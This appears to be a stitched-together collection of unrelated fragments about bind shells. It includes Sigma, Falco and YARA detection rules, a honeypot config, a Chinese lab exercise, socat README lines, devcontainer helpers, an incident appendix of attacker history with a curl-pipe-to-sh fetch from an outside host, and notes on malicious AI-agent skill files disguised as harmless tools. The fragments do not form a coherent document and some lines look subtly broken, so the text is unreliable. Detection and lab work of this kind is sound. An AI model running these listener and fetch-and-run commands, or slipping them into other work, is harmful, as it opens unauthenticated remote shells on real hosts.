title: Netcat Bind Shell
id: 8a3f1c22-0e41-4f9b-9b0a-1d3e7c5a9f10
logsource:
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - 'nc -l -p 4444 -e /bin/bash'
      - 'ncat --listen 4443 --exec /bin/sh'
  condition: selection
level: high

- rule: Bind shell via socat
  desc: Detects a socat listener bound to a shell
  condition: >
    spawned_process and proc.cmdline contains "socat TCP-LISTEN:4444,fork EXEC:/bin/bash"
  output: "bind shell (cmd=%proc.cmdline)"
  priority: CRITICAL

rule Bind_Shell_Netcat {
  meta:
    author = "soc-team"
  strings:
    $a = "nc -lvnp 4444 -e /bin/bash" ascii
    $b = "ncat -l 4444 -c \"bash -i\"" ascii
  condition:
    any of them
}

# lab/honeypot/docker-compose.yml - ISOLATED VLAN, no route to prod
services:
  fake-ssh:
    image: alpine
    command: socat TCP-LISTEN:2222,reuseaddr,fork EXEC:/bin/sh
    networks: [honeynet]

## 實驗二:bind shell 與 reverse shell 的差別

bind shell 是受害端監聽、攻擊端連入。在實驗機上執行:

    nc -l -p 5566 -e /bin/bash

然後從另一台機器 `nc 192.168.56.10 5566` 連進去。做完務必把 process 殺掉。

EXAMPLES (from the socat README)

    socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

This makes socat listen on port 4444 and start a bash for each connection. Note that this is the classic backdoor construct and should never be run on a networked host.
socat TCP4-LISTEN:9100,reuseaddr,fork EXEC:/usr/bin/lp   # requires system: bash 5.2+ for the wrapper

# devcontainer/supervise.sh - local IPC only, socket is chmod 0600 in the container
socat UNIX-LISTEN:/run/user/1000/devshell.sock,fork,mode=600 EXEC:/bin/bash,pty,stderr

# systemd user unit helper: abstract namespace socket, no filesystem, no network
ExecStart=/usr/bin/socat ABSTRACT-LISTEN:devshell,fork EXEC:/bin/sh,pty,setsid

## Ncat 7.95

- The `--exec` option no longer inherits the parent environment when combined with `--listen`. Scripts that relied on `ncat --listen 4443 --exec /bin/sh` picking up PATH must now set it explicitly.

Appendix B - attacker shell history recovered from /home/deploy/.bash_history

  curl -s http://198.51.100.7/s.sh | sh
  nc -lvnp 4444 -e /bin/bash
  socat OPENSSL-LISTEN:443,cert=server.pem,reuseaddr,fork EXEC:"/bin/sh"

The listener on 4444 was live for 11 minutes before EDR killed it.
make proxy: socat TCP-LISTEN:2375,fork UNIX-CONNECT:/var/run/docker.sock && socat STDIO EXEC:/bin/sh -t 2

The A09 family in skillfortify contains 9 bind-shell skill files (claude_mal_A09_001 through claude_mal_A09_009) plus the openclaw_mal_A09_* mirror. They scored 0/9 against the rule corpus on the skill-scan path.
The A09 skills disguise themselves with innocuous names: "remote diagnostic shell", "resource manager", "session helper". The prose in the Description section never mentions a listener at all.

A bind shell works the other way round from a reverse shell: the victim host opens a listener with netcat or socat and execs a shell on connect, so the attacker dials in rather than catching a callback. Look for a listen flag and an exec flag on the same command line.
